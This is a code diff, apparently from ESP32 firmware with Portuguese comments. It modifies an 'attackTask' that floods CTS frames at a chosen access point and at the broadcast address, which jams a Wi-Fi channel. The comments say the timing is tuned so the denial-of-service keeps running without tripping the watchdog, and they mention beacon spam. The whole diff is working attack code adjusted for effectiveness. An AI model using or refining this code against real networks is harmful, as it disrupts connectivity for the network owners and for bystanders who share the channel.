@@ -152,23 +152,22 @@ void attackTask(void *parameter) {
         static const uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF,
                                                 0xFF, 0xFF, 0xFF};
 
-        // Reduzido de 8 para 4 frames por burst, delay maior entre cada um
-        for (int i = 0; i < 4; i++) {
-          wsl_bypasser_send_cts_frame(apRecordSelecionado.bssid);
-          ctsCounter++;
-          vTaskDelay(pdMS_TO_TICKS(5)); // era 1ms, agora 5ms
+        // Envia APENAS 1 par por ciclo. Cada CTS reserva 32,7ms do canal.
+        // Um delay de 25-30ms mantém o canal ocupado e, crucialmente, 
+        // permite que o Driver Wi-Fi esvazie a fila de TX, evitando o Watchdog.
+        wsl_bypasser_send_cts_frame(apRecordSelecionado.bssid);
+        ctsCounter++;
 
-          wsl_bypasser_send_cts_frame(broadcast_mac);
-          ctsCounter++;
-          vTaskDelay(pdMS_TO_TICKS(5));
-        }
+        wsl_bypasser_send_cts_frame(broadcast_mac);
+        ctsCounter++;
 
         xSemaphoreGive(wifiMutex);
-        vTaskDelay(pdMS_TO_TICKS(20)); // era 5ms, agora 20ms
+        
+        // Delay que evita saturar a fila (WDT Reset) e ao mesmo tempo mantém o DoS
+        vTaskDelay(pdMS_TO_TICKS(25));
+      } else {
+        vTaskDelay(pdMS_TO_TICKS(10));
       }
-
-      // Cede tempo ao sistema fora do semáforo também
-      vTaskDelay(pdMS_TO_TICKS(10));
     }
 
     // BEACON SPAM — N redes fixas no celular, ataque contínuo
